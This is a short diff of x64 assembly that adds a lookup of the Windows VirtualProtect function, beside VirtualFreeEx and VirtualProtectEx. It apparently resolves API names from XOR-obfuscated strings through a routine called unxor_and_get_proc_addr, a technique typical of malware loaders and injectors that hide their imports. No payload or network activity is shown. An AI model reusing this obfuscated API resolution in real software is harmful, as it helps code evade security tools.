@@ -1,8 +1,3 @@
-section .text
-
-; extern GetStdHandle
-; extern WriteFile
-
 ; arg0: src         rcx
 ; arg1: dst         rdx
 ; arg2: nBytes      r8
@@ -1099,6 +1094,15 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr                ; proc addr
 
     mov [virtual_free_ex], rax                  ; VirtualFreeEx addr
+
+    mov rcx, [rbp + 16]
+    mov rdx, virtual_protect_xor
+    mov r8, virtual_protect_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_protect], rax                  ; VirtualProtect addr
+
 
     mov rcx, [rbp + 16]
     mov rdx, virtual_protect_ex_xor
